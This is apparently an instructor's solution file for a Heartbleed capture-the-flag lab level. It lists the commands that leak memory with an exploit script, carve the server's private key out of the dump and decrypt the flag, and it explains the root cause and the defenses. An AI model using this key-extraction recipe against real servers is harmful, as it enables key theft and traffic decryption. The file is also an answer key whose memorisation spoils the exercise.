# Solution — Level 2 (instructor reference)

> Keep out of player hands. Reference path + root cause for grading and the report.

## Intended path
1. `docker compose up --build`. At boot the `vulnerable` entrypoint:
   - generates a fresh RSA-2048 key + self-signed cert,
   - encrypts `LAB_FLAG_L2` to that key's public half with `pkeyutl` and writes
     the ciphertext to the shared volume (`/share/flag2.enc`),
   - keeps BOTH secrets resident in heap by replaying one padded GET per cycle
     carrying the credentials and the key. The key's newlines/spaces are encoded
     as `~`/`_` so it fits on a single request line; a leading pad absorbs the
     fixed head-loss of the over-read so the whole key is captured.
   The webapp serves the ciphertext at `GET /flag2.enc`.
2. Player downloads the ciphertext: `curl -s localhost:8090/flag2.enc -o flag2.enc`.
3. Player leaks raw memory with `heartbleedExploit.py vulnerable --raw > leak.bin`,
   greps the one-line key, and undoes the encoding:
   `strings leak.bin | grep -oE '[-]{5}BEGIN_PRIVATE_KEY[-]{5}~[A-Za-z0-9+/=~]+~[-]{5}END_PRIVATE_KEY[-]{5}' | head -1 | tr '~_' '\n ' > key.pem`.
4. Player decrypts: `openssl pkeyutl -decrypt -inkey key.pem -in flag2.enc`
   → `LAB_FLAG_L2`, then `./ctf.sh submit attack-02 <flag>`.

## Root cause / what it teaches
Same bug as level 1 (`tls1_process_heartbeat` over-read), but it escalates the
impact from a single credential to the server's **private key**. This is the
real-world severity of Heartbleed: key compromise means an attacker can decrypt
past traffic (no forward secrecy with RSA key exchange) and impersonate the
server. The lesson chain for the defense levels: rotate/revoke keys after
exposure, prefer forward-secret cipher suites, and patch the library.

Note: the key is *reliably* leakable here because the entrypoint replays the PEM
into heap (the `~`/`_` single-line encoding + leading pad are lab conveniences so
every over-read captures the whole key). Real Heartbleed key recovery is
probabilistic (leaking the BIGNUM primes) — that is the optional "hard mode"
variant, not this level. The exploit also sends max-size (0xFFFF) heartbeats and
several per connection to make the leak dependable.

## Verifying the flag
The real flag is `LAB_FLAG_L2` in the gitignored `shared/secrets.env`. It is
only recoverable by decrypting `/flag2.enc`, which requires the leaked private
key, so a correct submission proves the player recovered the key.
`./ctf.sh submit attack-02 <flag>` compares to `LAB_FLAG_L2`.
